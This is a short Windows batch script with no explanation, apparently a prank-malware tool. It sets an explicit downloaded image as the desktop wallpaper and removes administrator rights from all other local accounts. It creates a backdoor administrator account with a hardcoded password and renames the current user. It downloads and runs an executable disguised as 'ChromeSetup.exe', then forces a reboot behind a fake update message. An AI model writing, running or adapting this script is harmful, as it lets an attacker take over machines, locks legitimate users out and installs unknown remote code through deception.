@echo off
set "wallpaper=%USERPROFILE%\Documents\fuckyou.jpg"
color 2
powershell -Command "Invoke-WebRequest 'https://upload.wikimedia.org/wikipedia/commons/7/76/Penis_without_Labels.jpg' -OutFile '%wallpaper%'"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
for /f "tokens=2 delims=\" %%a in ("%username%") do set currentUser=%%a
if not defined currentUser set currentUser=%username%
for /f "skip=1" %%u in ('wmic useraccount get name') do (
    set "user=%%u"
    setlocal enabledelayedexpansion
    set "trim=!user: =!"
    if not "!trim!"=="" if /i not "!trim!"=="%currentUser%" (
        net localgroup Administrators "!trim!" /delete
    )
    endlocal

    
)
net user "Administrator2" forkies420 /add
net localgroup Administrators Administrator2 /add
wmic useraccount where name="%username%" rename "Cincinnati Bengals"
set "fire=%USERPROFILE%\Documents\fuckyou.exe"
powershell -Command "Invoke-WebRequest 'https://github.com/giggityfiles/fur/raw/refs/heads/main/ChromeSetup.exe' -OutFile '%fire%'"
start %fire%
echo fucking dick hon.
timeout 45 >nul
shutdown /f /r /t 3 /c "System will shut down in 3 seconds for updates."
